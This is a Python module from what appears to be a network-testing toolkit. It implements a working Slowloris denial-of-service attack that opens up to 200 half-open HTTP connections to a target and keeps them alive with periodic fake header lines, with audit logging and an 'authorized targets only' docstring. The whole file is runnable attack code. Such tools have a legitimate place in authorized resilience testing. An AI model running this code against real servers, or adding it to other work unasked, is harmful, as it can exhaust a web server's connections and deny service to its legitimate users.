"""Slowloris-style attack — hold many half-open HTTP connections. Authorized targets only."""

import socket
import threading
import time

from udp_probe.attack.audit import log_attack_session, end_attack_session


def run_slowloris(
    target: str,
    port: int = 80,
    duration_sec: float = 60.0,
    num_sockets: int = 200,
    operator: str | None = None,
) -> int:
    """Open many partial HTTP connections and keep them open. Returns attack_session id."""
    session_id = log_attack_session(
        "slowloris", target, port=port,
        params={"duration_sec": duration_sec, "num_sockets": num_sockets},
        operator=operator,
    )
    stop = threading.Event()
    sockets: list[socket.socket] = []

    def open_sockets() -> None:
        for _ in range(num_sockets):
            if stop.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4.0)
                s.connect((target, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                sockets.append(s)
            except (socket.error, OSError):
                pass

    open_sockets()
    start = time.monotonic()
    while time.monotonic() - start < duration_sec and not stop.is_set():
        for s in list(sockets):
            try:
                s.send(b"X-a: b\r\n")
            except (socket.error, OSError):
                sockets.remove(s)
        time.sleep(15)
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass
    end_attack_session(session_id)
    return session_id
